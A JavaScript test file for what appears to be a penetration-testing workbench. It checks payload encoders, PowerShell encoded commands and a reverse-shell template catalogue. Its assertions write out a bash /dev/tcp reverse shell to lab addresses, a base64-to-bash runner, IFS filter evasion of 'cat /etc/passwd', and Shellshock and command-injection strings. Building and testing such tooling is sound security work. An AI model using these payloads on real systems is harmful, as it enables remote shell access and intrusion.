/* Workbench engine (OBOL.workbench): encoders and the reverse-shell catalogue. Locks the byte-exact
 * base64 (round-trips), the PowerShell -EncodedCommand (UTF-16LE then base64), template filling, and
 * that every catalogue entry is well formed. Pure, generic data. */
'use strict';
require('../../assets/engine/workbench.js');
const OBOL = globalThis.OBOL, W = OBOL.workbench;

let fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// base64 against node's own Buffer (ground truth)
['', 'a', 'ab', 'abc', 'hello world', 'id;whoami', '() { :;}; echo vulnerable', 'café ☕'].forEach(function (s) {
  ok(W.b64(s) === Buffer.from(s, 'utf8').toString('base64'), 'b64 matches node Buffer for ' + JSON.stringify(s));
});
// base64 round-trips through our own decoder
['', 'abc', 'hello world', 'café ☕', 'id;whoami'].forEach(function (s) {
  ok(W.b64decode(W.b64(s)) === s, 'b64 round-trips ' + JSON.stringify(s));
});

// PowerShell -EncodedCommand: base64 of UTF-16LE bytes, byte-identical to node's own encoding
const ps = 'whoami';
ok(W.psEnc(ps) === Buffer.from(ps, 'utf16le').toString('base64'), 'psEnc matches node utf16le base64');
ok(W.psEnc(ps) === 'dwBoAG8AYQBtAGkA', 'psEnc(whoami) is the known value');

// other encoders
ok(W.hexEnc('AB') === '4142', 'hexEnc AB -> 4142');
ok(W.rot13('abcABC') === 'nopNOP', 'rot13 basic');
ok(W.rot13(W.rot13('Hello, World!')) === 'Hello, World!', 'rot13 is its own inverse');
ok(W.urlEncAll('a b') === '%61%20%62', 'urlEncAll encodes every byte');
ok(W.ifsEvade('cat /etc/passwd') === 'cat${IFS}/etc/passwd', 'ifsEvade swaps spaces');

// template filling
const bash = W.revShell('bash-i');
ok(bash && /bash -i/.test(bash.tpl), 'bash-i entry exists');
ok(W.fill(bash.tpl, { lhost: '10.10.14.2', lport: '4444' }) === 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1', 'fill substitutes lhost/lport');
ok(W.fill(bash.tpl, { lhost: '10.10.14.2' }).indexOf('{{lport}}') >= 0, 'missing value stays a visible token');

// linux base64 runner wraps and decodes back to the original
const cmd = W.fill(bash.tpl, { lhost: '10.0.0.1', lport: '9001' });
const runner = W.linuxB64Runner(cmd);
ok(/\| base64 -d \| bash$/.test(runner), 'linuxB64Runner pipes to base64 -d | bash');
ok(W.b64decode(runner.split(' ')[1]) === cmd, 'the runner payload decodes back to the command');

// catalogue integrity
ok(W.REVSHELLS.length >= 12, 'catalogue has the common set (' + W.REVSHELLS.length + ')');
const ids = {};
W.REVSHELLS.forEach(function (e) {
  ok(e.id && e.name && e.tpl && e.note, 'entry ' + e.id + ' is well formed');
  ok(!ids[e.id], 'id ' + e.id + ' is unique'); ids[e.id] = 1;
  ok(['linux', 'windows'].indexOf(e.os) >= 0, 'entry ' + e.id + ' has a known os');
});
ok(W.revShell('ps-tcp').enc.indexOf('psenc') >= 0, 'the PowerShell TCP shell offers -EncodedCommand');

console.log(fail ? ('\nWORKBENCH: ' + fail + ' FAILURES') : '\nWORKBENCH: all passed');
process.exit(fail ? 1 : 0);
